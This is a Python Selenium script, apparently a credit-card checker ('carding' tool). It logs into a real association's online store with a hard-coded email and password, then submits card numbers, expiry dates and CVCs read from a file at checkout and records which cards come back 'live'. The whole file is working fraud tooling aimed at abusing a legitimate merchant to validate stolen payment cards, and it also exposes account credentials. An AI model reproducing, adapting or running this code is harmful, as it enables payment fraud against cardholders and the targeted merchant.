from os import system
try:
    from colorama import Fore, Style
    from selenium import webdriver
    from selenium.webdriver.support.ui import WebDriverWait, Select
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.by import By
    from string import ascii_lowercase
    from time import sleep
    import random
except:
    system('pip install colorma, selenium')
    from colorama import Fore, Style
    from selenium import webdriver
    from selenium.webdriver.support.ui import WebDriverWait, Select
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.by import By
    from string import ascii_lowercase
    from time import sleep
    import random
system('cls')

def blue(webdriverop, ccs):
    if webdriverop == 2:
        op = webdriver.FirefoxOptions()
        op.add_argument('--headless')
        driver = webdriver.Firefox(options=op)
    else:
        op = webdriver.ChromeOptions()
        op.add_experimental_option('excludeSwitches', ['enable-logging'])
        op.add_argument('--headless')
        driver = webdriver.Chrome(options=op)
    result_str = ''.join(random.choice(ascii_lowercase) for i in range(16))
    driver.get('https://imis.counseling.org/store/SearchResults.aspx?searchterm=pencil&searchoption=ALL')
    WebDriverWait(driver, 60) \
        .until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[2]/div/a'))) \
        .click()
    WebDriverWait(driver, 60) \
        .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[4]/div/div[3]/div/div[2]/div[3]/div/div/span/span/div[1]/div[1]/div[2]/div[5]/div/div/div/table/tbody/tr/td[2]/div/input'))) \
        .click()
    WebDriverWait(driver, 60) \
        .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[6]/div/div/div/div[3]/input[3]'))) \
        .click()
    WebDriverWait(driver, 60) \
        .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[6]/div[1]/div/div[2]/div/div[2]/input'))) \
        .click()
    WebDriverWait(driver, 5) \
        .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[6]/div[5]/div/div[2]/div/div[2]/div[2]/div[2]/div/div[2]/div/div/div[3]/div/div[1]/div[2]/div/div/div/div[1]/div/div[3]/div[1]/input'))) \
        .send_keys('daniinegre@gmail.com')
    WebDriverWait(driver, 5) \
        .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[6]/div[5]/div/div[2]/div/div[2]/div[2]/div[2]/div/div[2]/div/div/div[3]/div/div[1]/div[2]/div/div/div/div[1]/div/div[3]/div[2]/input'))) \
        .send_keys('MRsK04L4.')
    WebDriverWait(driver, 5) \
        .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[6]/div[5]/div/div[2]/div/div[2]/div[2]/div[2]/div/div[2]/div/div/div[3]/div/div[1]/div[2]/div/div/div/div[3]/input'))) \
        .click()
    WebDriverWait(driver, 60) \
        .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[6]/div[1]/div/div[2]/div/div[2]/input'))) \
        .click()
    WebDriverWait(driver, 60) \
        .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[4]/div[1]/div/div/div/div[3]/div/input'))) \
        .click()
    for cc in ccs:
        a = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        c = a.split('|')
        cc = c[0]
        cvc = c[3]
        mt = int(c[1])
        ye = int(c[2].replace('20', ''))
        WebDriverWait(driver, 5) \
            .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[7]/div[1]/div/div[2]/div/div[1]/div/div[1]/div/div[2]/div[2]/div[1]/  div/div/div[2]/div[2]/div/div/div[2]/div[1]/input'))) \
            .send_keys(cc)
        Select(driver.find_element('xpath', '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[7]/div[1]/div/div[2]/div/div[1]/div/div[1]/div/div[2]/div[2]/div[1]/div/div/div    [2]/div[2]/div/div/div[2]/div[2]/div[3]/select')).select_by_index(int(mt -1))
        ##yebut.select_by_index()
        Select(driver.find_element('xpath', '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[7]/div[1]/div/div[2]/div/div[1]/div/div[1]/div/div[2]/div[2]/div[1]/div/div/div    [2]/div[2]/div/div/div[2]/div[2]/div[3]/select')).select_by_index(int(ye - 23))
        WebDriverWait(driver, 5) \
            .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[7]/div[1]/div/div[2]/div/div[1]/div/div[1]/div/div[2]/div[2]/div[1]/  div/div/div[2]/div[2]/div/div/div[3]/div/input'))) \
            .send_keys(cvc)
        WebDriverWait(driver, 5) \
            .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[7]/div[1]/div/div[3]/div[3]/div/input'))) \
            .click()
        try:
            WebDriverWait(driver, 5) \
            .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[7]/div[1]/div/div[3]/div[3]/div/input'))) \
            .click()
        except:
            pass
        try:
            WebDriverWait(driver, 5) \
                .until(EC.element_to_be_clickable((By.XPATH,'/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[7]/div[1]/div/span[2]')))
            respoce = driver.find_element('xpath', '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[7]/div[1]/div/span[2]')
            responce = respoce.text
            WebDriverWait(driver, 5) \
                .until(EC.element_to_be_clickable((By.XPATH, '/html/body/form/div[5]/div[5]/div/div[2]/div[1]/div[7]/div[1]/div/input'))) \
                .click()
        except:
            responce = 'live'
        print(Fore.RED + f'{cc} | ' + responce)
        with open('responces.txt', 'a') as f:
                    f.write(cc + ' | ' + responce + '\n')
                    f.close()
        print(Style.RESET_ALL)
    driver.close()

if __name__ == "__main__":
    print('1- Chrome \n2- Firefox' + Fore.RED + '(RECOMENDADO)')
    print(Style.RESET_ALL)
    web = int(input('porfavor seleccione su navegador:: '))
    ccs = open('ccs.txt').read().split()
    blue(web, ccs)